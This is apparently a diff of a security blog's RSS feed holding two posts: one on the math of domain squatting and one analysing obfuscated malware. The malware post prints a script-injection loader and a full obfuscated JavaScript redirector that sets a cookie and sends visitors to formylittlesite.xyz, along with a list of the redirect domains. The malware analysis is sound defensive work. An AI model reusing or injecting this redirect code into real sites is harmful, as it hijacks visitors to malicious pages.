@@ -1,4 +1,208 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting on Floyd Hightower</title><link>https://hightower.space/tags/threat-hunting/</link><description>Recent content in Threat Hunting on Floyd Hightower</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 23 Feb 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://hightower.space/tags/threat-hunting/index.xml" rel="self" type="application/rss+xml"/><item><title>Domain Squatting Math</title><link>https://hightower.space/posts/math-behind-domain-squatting/</link><pubDate>Sat, 23 Feb 2019 00:00:00 +0000</pubDate><guid>https://hightower.space/posts/math-behind-domain-squatting/</guid><description>&amp;ldquo;Compound interest is the eighth wonder of the world. He who understands it, earns it &amp;hellip; he who doesn&amp;rsquo;t &amp;hellip; pays it.&amp;rdquo;
-― Albert Einstein
-What is domain squatting? Domain squatting is when someone registers a domain name which looks like another domain name. Usually, the term &amp;ldquo;domain squatting&amp;rdquo; is used in a context where malicious intent is implied. For example, someone trying to steal passwords may register the domain name gooogle.</description></item><item><title>Analysis of Obfuscated PHP Malware</title><link>https://hightower.space/posts/php-malware-analysis-jan-29-part-1/</link><pubDate>Tue, 29 Jan 2019 00:00:00 +0000</pubDate><guid>https://hightower.space/posts/php-malware-analysis-jan-29-part-1/</guid><description>Updated on February 27, 2019.
-I am monitoring the php decoder site here and was alerted when the decoded php here had a String.fromCharCode command in it. After decoding the character code (104, 116, 116, 112, 115, 58, 47, 47, 103, 101, 116, 109, 121, 99, 111, 110, 102, 105, 103, 112, 108, 101, 97, 115, 101, 46, 99, 111, 109, 47, 103, 101, 116, 46, 112, 104, 112)1 --, this produced https://getmyconfigplease[.</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting on Floyd</title><link>https://hightower.space/tags/threat-hunting/</link><description>Recent content in Threat Hunting on Floyd</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 23 Feb 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://hightower.space/tags/threat-hunting/index.xml" rel="self" type="application/rss+xml"/><item><title>Domain Squatting Math</title><link>https://hightower.space/posts/math-behind-domain-squatting/</link><pubDate>Sat, 23 Feb 2019 00:00:00 +0000</pubDate><guid>https://hightower.space/posts/math-behind-domain-squatting/</guid><description>&lt;blockquote>
+&lt;p>&amp;ldquo;Compound interest is the eighth wonder of the world. He who understands it, earns it &amp;hellip; he who doesn&amp;rsquo;t &amp;hellip; pays it.&amp;rdquo;&lt;/p>
+&lt;p>― Albert Einstein&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="what-is-domain-squatting">What is domain squatting?&lt;/h2>
+&lt;p>Domain squatting is when someone registers a domain name which looks like another domain name. Usually, the term &amp;ldquo;domain squatting&amp;rdquo; is used in a context where malicious intent is implied. For example, someone trying to steal passwords may register the domain name &lt;code>gooogle.com&lt;/code> (with an extra &lt;code>o&lt;/code> in it). This way, he/she could send emails to potential victims with links to &lt;code>gooogle.com&lt;/code> and the potential victims would be more likely to mistake this domain for the real thing and click the links.&lt;/p>
+&lt;h2 id="the-math-of-domain-squatting">The math of domain squatting&lt;/h2>
+&lt;p>The are &lt;a href="https://github.com/xn-twist/xn-twist">numerous&lt;/a> &lt;a href="https://github.com/elceef/dnstwist">algorithms&lt;/a> available to find domain squats for a given domain, but the difficulty is that finding domain squats for a given domain is computationally difficult and demonstrates exponential growth. Let&amp;rsquo;s examine this a bit more.&lt;/p>
+&lt;p>For starters, how many possible domain squats are there for &lt;code>abc.com&lt;/code>? Let&amp;rsquo;s assume the &lt;a href="https://en.wikipedia.org/wiki/Top-level_domain">top level domain&lt;/a> (e.g. &lt;code>.com&lt;/code>) remains the same - we&amp;rsquo;ll just focus on the &lt;code>abc&lt;/code> bit. Let&amp;rsquo;s also pretend that there are two characters which can replace each of the characters in &lt;code>abc&lt;/code>. In other words, we can replace &lt;code>a&lt;/code> with &lt;code>а&lt;/code> (a character from the Cyrillic alphabet) or &lt;code>α&lt;/code> (a character from the Greek alphabet) and we can replace both &lt;code>b&lt;/code> and &lt;code>c&lt;/code> with two other characters as well. So, for each character in &lt;code>abc&lt;/code>, we have three options:&lt;/p>
+&lt;ol>
+&lt;li>Replace it with the first option&lt;/li>
+&lt;li>Replace it with the second option&lt;/li>
+&lt;li>Keep it the same&lt;/li>
+&lt;/ol>
+&lt;p>For each character, we have the three options we listed above, so all possible combinations amount to: &lt;code>3 * 3 * 3 = 27&lt;/code>. But, one of the twenty seven configurations is one in which all of the characters in the original domain are kept the same. Because this does not constitute a domain squat, we remove this one to get &lt;code>26&lt;/code> as our final answer. A domain with three characters and an average of two replacements per character can produce twenty six domain squats!&lt;/p>
+&lt;p>We can represent the number of domain squats formulaically as:&lt;/p>
+&lt;pre tabindex="0">&lt;code>((r + 1) ^ n) - 1
+&lt;/code>&lt;/pre>&lt;p>where&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>r&lt;/code> is the number of characters which can replace each character in the domain&lt;/li>
+&lt;li>&lt;code>n&lt;/code> is number of characters in the domain&lt;/li>
+&lt;/ul>
+&lt;p>Thus, the number of possible replaces for a domain name that is 10 characters long assuming we can replace each character with 10 other characters is: &lt;code>((10 + 1) ^ 10) - 1 = (11 ^ 10) - 1 = 25,937,424,600&lt;/code>. 25 &lt;strong>billion&lt;/strong> possible domain squats! This is the challenge of finding domain squats; it is a system that grows exponentially. What if we keep everything the same, but find domain squats for a domain which is 11 characters long? That works out to be: &lt;code>10 ^ 11 = 285,311,670,610&lt;/code>. 285 &lt;strong>billion&lt;/strong>! If you were to plot 25 billion on a number line stretching between zero and 285 billion, it would look something like:&lt;/p>
+&lt;p>&lt;code>0....|............................................285,000,000,000&lt;/code>&lt;/p>
+&lt;p>Adding one more character to our domain name, we have exponentially increased the possible squats.&lt;/p>
+&lt;p>Below is some &lt;a href="https://clojure.org/api/cheatsheet">clojure&lt;/a> code you can play with to find the number of domain squats for domains of various lengths. Notice that adding one character to a domain&amp;rsquo;s length increases the amount of time required to find all domain squats exponentially (non-linearly)!&lt;/p>
+&lt;link rel="stylesheet" type="text/css" href="https://storage.googleapis.com/app.klipse.tech/css/codemirror.css">
+&lt;script>
+window.klipse_settings = {
+selector: '.language-klipse'
+};
+&lt;/script>
+&lt;pre>&lt;code class="language-klipse">
+(defn pow [n x]
+(reduce * (repeat x n)))
+(defn possible-domain-squats [domain-length avg-replacement-chars]
+(dec (pow (inc avg-replacement-chars) domain-length)))
+; change the values below to see how the possible domain squats change
+(def domain-length 10)
+(def avg-replacement-chars 10)
+(possible-domain-squats domain-length avg-replacement-chars)
+&lt;/code>&lt;/pre>
+&lt;p>Here is another way to systematically observe how the number of domain squats changes with the size of the domain name. We assume ten replacement characters (that is, each character in the domain can be replaced with ten characters - which is very reasonable) for domains of varying lengths:&lt;/p>
+&lt;pre>&lt;code class="language-klipse">
+(for [domain-length (range 3 16)
+:let [squats (possible-domain-squats domain-length 10)]]
+{:domain-length domain-length :squats squats})
+&lt;/code>&lt;/pre>
+&lt;script src="https://storage.googleapis.com/app.klipse.tech/plugin/js/klipse_plugin.js">&lt;/script></description></item><item><title>Analysis of Obfuscated PHP Malware</title><link>https://hightower.space/posts/php-malware-analysis-jan-29-part-1/</link><pubDate>Tue, 29 Jan 2019 00:00:00 +0000</pubDate><guid>https://hightower.space/posts/php-malware-analysis-jan-29-part-1/</guid><description>&lt;p>&lt;i>Updated on February 27, 2019.&lt;/i>&lt;/p>
+&lt;p>I am monitoring the php decoder site &lt;a href="https://malwaredecoder.com/">here&lt;/a> and was alerted when the decoded php &lt;a href="https://malwaredecoder.com/result/2333ee92d6f6872f6b5e685a9f4b3ed3">here&lt;/a> had a &lt;code>String.fromCharCode&lt;/code> command in it. After decoding the character code (&lt;code>104, 116, 116, 112, 115, 58, 47, 47, 103, 101, 116, 109, 121, 99, 111, 110, 102, 105, 103, 112, 108, 101, 97, 115, 101, 46, 99, 111, 109, 47, 103, 101, 116, 46, 112, 104, 112&lt;/code>)&lt;!-- &lt;sup>1&lt;/sup> -->, this produced &lt;code>https://getmyconfigplease[.]com/get[.]php&lt;/code>. The content of this site looks like:&lt;/p>
+&lt;pre tabindex="0">&lt;code>var sECIQY8TzC = document.createElement(&amp;#39;script&amp;#39;); sECIQY8TzC.type = &amp;#39;text/javascript&amp;#39;; sECIQY8TzC.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 69, 110, 78, 75, 113, 71, 76, 78); document.head.appendChild(sECIQY8TzC);
+&lt;/code>&lt;/pre>&lt;p>Decoding the &lt;code>String.fromCharCode&lt;/code> bit&lt;!-- &lt;sup>2&lt;/sup> --> produces &lt;code>https://pastebin.com/raw/EnNKqGLN&lt;/code>.&lt;/p>
+&lt;!-- &lt;aside class="marginnote">
+&lt;p>&lt;span class="noteNumber">1&lt;/span> - In biblioteca: &lt;code>fromCharCode([104, 116, 116, 112, 115, 58, 47, 47, 103, 101, 116, 109, 121, 99, 111, 110, 102, 105, 103, 112, 108, 101, 97, 115, 101, 46, 99, 111, 109, 47, 103, 101, 116, 46, 112, 104, 112])&lt;/code>&lt;/p>
+&lt;p>&lt;span class="noteNumber">2&lt;/span> - In biblioteca: &lt;code>fromCharCode([104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 69, 110, 78, 75, 113, 71, 76, 78])&lt;/code>&lt;/p>
+&lt;/aside> -->
+&lt;p>The content of this site is:&lt;/p>
+&lt;pre tabindex="0">&lt;code>function _0x16ac9e(){var _0x11da69=[&amp;#39;MHgy&amp;#39;,&amp;#39;MHgz&amp;#39;,&amp;#39;MHg0&amp;#39;,&amp;#39;MHg2&amp;#39;,&amp;#39;aHJlZg==&amp;#39;,&amp;#39;cmVwbGFjZQ==&amp;#39;,&amp;#39;bG9jYXRpb24=&amp;#39;,&amp;#39;aW5kZXhPZg==&amp;#39;,&amp;#39;Y29va2ll&amp;#39;,&amp;#39;QmVzdENvb2tpZT10cnVlOyBtYXgtYWdlPTIwNDAw&amp;#39;,&amp;#39;c2hpZnQ=&amp;#39;,&amp;#39;MHgw&amp;#39;,&amp;#39;MHgx&amp;#39;];(function(_0x538417,_0x48f8ea){var _0x350dbc=function(_0x2e576b){while(--_0x2e576b){_0x538417[&amp;#39;push&amp;#39;](_0x538417[&amp;#39;shift&amp;#39;]());}};_0x350dbc(++_0x48f8ea);}(_0x11da69,0xd5));var _0x4097a7=function(_0x506a3d,_0x321114){_0x506a3d=_0x506a3d-0x0;var _0x32b6f7=_0x11da69[_0x506a3d];if(_0x4097a7[&amp;#39;cNcBaR&amp;#39;]===undefined){(function(){var _0x29eb7d;try{var _0x4e84d1=Function(&amp;#39;return\x20(function()\x20&amp;#39;+&amp;#39;{}.constructor(\x22return\x20this\x22)(\x20)&amp;#39;+&amp;#39;);&amp;#39;);_0x29eb7d=_0x4e84d1();}catch(_0x476c5c){_0x29eb7d=window;}var _0x3b1078=&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#39;;_0x29eb7d[&amp;#39;atob&amp;#39;]||(_0x29eb7d[&amp;#39;atob&amp;#39;]=function(_0x2199f9){var _0x207876=String(_0x2199f9)[&amp;#39;replace&amp;#39;](/=+$/,&amp;#39;&amp;#39;);for(var _0x3d686c=0x0,_0x55acec,_0x22a388,_0x5795eb=0x0,_0x5c30ef=&amp;#39;&amp;#39;;_0x22a388=_0x207876[&amp;#39;charAt&amp;#39;](_0x5795eb++);~_0x22a388&amp;amp;&amp;amp;(_0x55acec=_0x3d686c%0x4?_0x55acec*0x40+_0x22a388:_0x22a388,_0x3d686c++%0x4)?_0x5c30ef+=String[&amp;#39;fromCharCode&amp;#39;](0xff&amp;amp;_0x55acec&amp;gt;&amp;gt;(-0x2*_0x3d686c&amp;amp;0x6)):0x0){_0x22a388=_0x3b1078[&amp;#39;indexOf&amp;#39;](_0x22a388);}return _0x5c30ef;});}());_0x4097a7[&amp;#39;qogRBP&amp;#39;]=function(_0xd61dcf){var _0x10ae9e=atob(_0xd61dcf);var _0x3a9531=[];for(var _0x3a6320=0x0,_0x8d019b=_0x10ae9e[&amp;#39;length&amp;#39;];_0x3a6320&amp;lt;_0x8d019b;_0x3a6320++){_0x3a9531+=&amp;#39;%&amp;#39;+(&amp;#39;00&amp;#39;+_0x10ae9e[&amp;#39;charCodeAt&amp;#39;](_0x3a6320)[&amp;#39;toString&amp;#39;](0x10))[&amp;#39;slice&amp;#39;](-0x2);}return decodeURIComponent(_0x3a9531);};_0x4097a7[&amp;#39;KYlgqs&amp;#39;]={};_0x4097a7[&amp;#39;cNcBaR&amp;#39;]=!![];}var _0x579681=_0x4097a7[&amp;#39;KYlgqs&amp;#39;][_0x506a3d];if(_0x579681===undefined){_0x32b6f7=_0x4097a7[&amp;#39;qogRBP&amp;#39;](_0x32b6f7);_0x4097a7[&amp;#39;KYlgqs&amp;#39;][_0x506a3d]=_0x32b6f7;}else{_0x32b6f7=_0x579681;}return _0x32b6f7;};var _0x2be368=[_0x4097a7(&amp;#39;0x0&amp;#39;),_0x4097a7(&amp;#39;0x1&amp;#39;),&amp;#39;fromCharCode&amp;#39;,&amp;#39;BestCookie=true&amp;#39;,_0x4097a7(&amp;#39;0x2&amp;#39;),_0x4097a7(&amp;#39;0x3&amp;#39;),_0x4097a7(&amp;#39;0x4&amp;#39;)];(function(_0x6e5b15,_0x2c75a3){var _0x42951f=function(_0x1975b5){while(--_0x1975b5){_0x6e5b15[&amp;#39;push&amp;#39;](_0x6e5b15[_0x4097a7(&amp;#39;0x5&amp;#39;)]());}};_0x42951f(++_0x2c75a3);}(_0x2be368,0x1c9));var _0x4755cb=function(_0x5ad1ee,_0x39c6df){_0x5ad1ee=_0x5ad1ee-0x0;var _0x38bd4b=_0x2be368[_0x5ad1ee];return _0x38bd4b;};var _0x443bde=[_0x4755cb(_0x4097a7(&amp;#39;0x6&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0x7&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0x8&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0x9&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0xa&amp;#39;)),_0x4755cb(&amp;#39;0x5&amp;#39;),_0x4755cb(_0x4097a7(&amp;#39;0xb&amp;#39;)),_0x4097a7(&amp;#39;0xc&amp;#39;)];var _0x4efd8b=String[_0x443bde[0x0]](0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x66,0x6f,0x72,0x6d,0x79,0x6c,0x69,0x74,0x74,0x6c,0x65,0x73,0x69,0x74,0x65,0x2e,0x78,0x79,0x7a,0x2f,0x6c,0x69,0x74,0x74,0x6c,0x65,0x2e,0x70,0x68,0x70);if(document[_0x443bde[0x3]][_0x443bde[0x2]](_0x443bde[0x1])==-0x1){document[_0x443bde[0x3]]=_0x443bde[0x4];window[_0x443bde[0x6]][_0x443bde[0x5]](_0x4efd8b);document[_0x443bde[0x6]][_0x443bde[0x5]](_0x4efd8b);window[_0x443bde[0x6]][_0x443bde[0x7]]=_0x4efd8b;document[_0x443bde[0x6]][_0x443bde[0x7]]=_0x4efd8b;}}_0x16ac9e();
+&lt;/code>&lt;/pre>&lt;h3 id="update-february-27-2019">Update (February 27, 2019)&lt;/h3>
+&lt;p>&lt;em>The content below was added on February 27, 2019.&lt;/em>&lt;/p>
+&lt;p>Upon further investigation, the code above contains the interesting snippet:&lt;/p>
+&lt;pre tabindex="0">&lt;code>(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x66,0x6f,0x72,0x6d,0x79,0x6c,0x69,0x74,0x74,0x6c,0x65,0x73,0x69,0x74,0x65,0x2e,0x78,0x79,0x7a,0x2f,0x6c,0x69,0x74,0x74,0x6c,0x65,0x2e,0x70,0x68,0x70)
+&lt;/code>&lt;/pre>&lt;p>This hex that decodes to:&lt;/p>
+&lt;pre tabindex="0">&lt;code>https://formylittlesite.xyz/little.php
+&lt;/code>&lt;/pre>&lt;p>Visitors to this site will be redirected to a URL on one of the following domains (the full URLs are listed below):&lt;/p>
+&lt;pre tabindex="0">&lt;code>appelertte.tk
+atlanta-rostov.ru
+avtonewsmir.ru
+avtoservis5plus.ru
+avtowoldsnews.ru
+creditforms.site
+edu-fddu.info
+giner.online
+greencool.icu
+informzine.site
+lentube.host
+merkuriu.icu
+picturesun.top
+rriverrponse.tk
+sarriverdoma.tk
+school-fix-news.info
+storics.info
+studentachieve.tk
+visnu.icu
+www.twero.com
+&lt;/code>&lt;/pre>&lt;p>Here are the URLs to which I was redirected:&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://appelertte.tk/index/?8mMwj2&amp;amp;extra_param_1=261
+http://appelertte.tk/index/?8mMwj2&amp;amp;extra_param_1=695
+http://atlanta-rostov.ru/2018/12/26/ken-shamrock-vs-kimbo-slice-full-fight/
+http://atlanta-rostov.ru/2018/12/27/rhythmbox-vs-banshee/
+http://atlanta-rostov.ru/latest.php
+http://avtonewsmir.ru/the-best-stock-photos/
+http://avtoservis5plus.ru/main-credit-reporting-agencies/
+http://avtowoldsnews.ru/forex-trading-for-dummies-2013-pdf/
+http://avtowoldsnews.ru/latest.php
+http://creditforms.site/average-car-insurance-rates-florida/
+http://creditforms.site/latest.php
+http://creditforms.site/the-carburetors/
+http://edu-fddu.info/blog/latest.php
+http://giner.online/can-you-apply-for-more-than-one-credit-card/
+http://greencool.icu/blog/?p=502
+http://greencool.icu/blog/latest.php
+http://informzine.site/2018/12/26/papigfunk/
+http://informzine.site/latest.php
+http://lentube.host/forex-trading-tutorials/
+http://lentube.host/latest.php
+http://lentube.host/top-forex-traders-in-the-world-2017/
+http://lentube.host/what-is-a-broker-forex-nu3p/
+http://merkuriu.icu/blog/?p=446
+http://picturesun.top/blog/?p=102
+http://picturesun.top/blog/?p=104
+http://picturesun.top/blog/?p=125
+http://picturesun.top/blog/?p=13
+http://picturesun.top/blog/?p=1348
+http://picturesun.top/blog/?p=1357
+http://picturesun.top/blog/?p=1382
+http://picturesun.top/blog/?p=1416
+http://picturesun.top/blog/?p=1444
+http://picturesun.top/blog/?p=1485
+http://picturesun.top/blog/?p=149
+http://picturesun.top/blog/?p=1494
+http://picturesun.top/blog/?p=1499
+http://picturesun.top/blog/?p=1509
+http://picturesun.top/blog/?p=1537
+http://picturesun.top/blog/?p=1553
+http://picturesun.top/blog/?p=156
+http://picturesun.top/blog/?p=1566
+http://picturesun.top/blog/?p=158
+http://picturesun.top/blog/?p=1589
+http://picturesun.top/blog/?p=1600
+http://picturesun.top/blog/?p=1611
+http://picturesun.top/blog/?p=1631
+http://picturesun.top/blog/?p=1651
+http://picturesun.top/blog/?p=1655
+http://picturesun.top/blog/?p=1658
+http://picturesun.top/blog/?p=1667
+http://picturesun.top/blog/?p=1675
+http://picturesun.top/blog/?p=1690
+http://picturesun.top/blog/?p=1694
+http://picturesun.top/blog/?p=174
+http://picturesun.top/blog/?p=178
+http://picturesun.top/blog/?p=18
+http://picturesun.top/blog/?p=183
+http://picturesun.top/blog/?p=209
+http://picturesun.top/blog/?p=213
+http://picturesun.top/blog/?p=226
+http://picturesun.top/blog/?p=242
+http://picturesun.top/blog/?p=252
+http://picturesun.top/blog/?p=256
+http://picturesun.top/blog/?p=268
+http://picturesun.top/blog/?p=274
+http://picturesun.top/blog/?p=280
+http://picturesun.top/blog/?p=306
+http://picturesun.top/blog/?p=312
+http://picturesun.top/blog/?p=314
+http://picturesun.top/blog/?p=334
+http://picturesun.top/blog/?p=348
+http://picturesun.top/blog/?p=354
+http://picturesun.top/blog/?p=374
+http://picturesun.top/blog/?p=376
+http://picturesun.top/blog/?p=380
+http://picturesun.top/blog/?p=382
+http://picturesun.top/blog/?p=396
+http://picturesun.top/blog/?p=404
+http://picturesun.top/blog/?p=418
+http://picturesun.top/blog/?p=426
+http://picturesun.top/blog/?p=430
+http://picturesun.top/blog/?p=448
+http://picturesun.top/blog/?p=452
+http://picturesun.top/blog/?p=458
+http://picturesun.top/blog/?p=470
+http://picturesun.top/blog/?p=476
+http://picturesun.top/blog/?p=480
+http://picturesun.top/blog/?p=484
+http://picturesun.top/blog/?p=500
+http://picturesun.top/blog/?p=513
+http://picturesun.top/blog/?p=517
+http://picturesun.top/blog/?p=523
+http://picturesun.top/blog/?p=527
+http://picturesun.top/blog/?p=529
+http://picturesun.top/blog/?p=531
+http://picturesun.top/blog/?p=537
+http://picturesun.top/blog/?p=541
+http://picturesun.top/blog/?p=543
+http://picturesun.top/blog/?p=545
+http://picturesun.top/blog/?p=551
+http://picturesun.top/blog/?p=557
+http://picturesun.top/blog/?p=565
+http://picturesun.top/blog/?p=567
+http://picturesun.top/blog/?p=569
+http://picturesun.top/blog/?p=573
+http://picturesun.top/blog/?p=575
+http://picturesun.top/blog/?p=622
+http://picturesun.top/blog/?p=86
+http://picturesun.top/blog/?p=92
+http://picturesun.top/blog/?p=96
+http://picturesun.top/blog/latest.php
+http://rriverrponse.tk/index/?8mMwj2&amp;amp;extra_param_1=695
+http://sarriverdoma.tk/index/?8mMwj2&amp;amp;extra_param_1=695
+http://school-fix-news.info/2019/01/09/car-accident-my-fault-will-my-insurance-go-up/
+http://storics.info/2018/12/27/business-credit-cards-for-bad-credit/
+http://storics.info/2018/12/27/cheapest-home-equity-line-of-credit/
+http://storics.info/2018/12/27/paid-in-full-on-credit-report/
+http://storics.info/2018/12/27/wipe-credit-clean/
+http://storics.info/latest.php
+http://visnu.icu/philadelphia-indemnity-car-insurance/
+https://www.twero.com/en/profiles?p=1027797&amp;amp;pi=test1&amp;amp;_=1548965393
+&lt;/code>&lt;/pre>&lt;p>I intend to more investigation on the registrant information for these domains at some point and will keep you posted!&lt;/p></description></item></channel></rss>
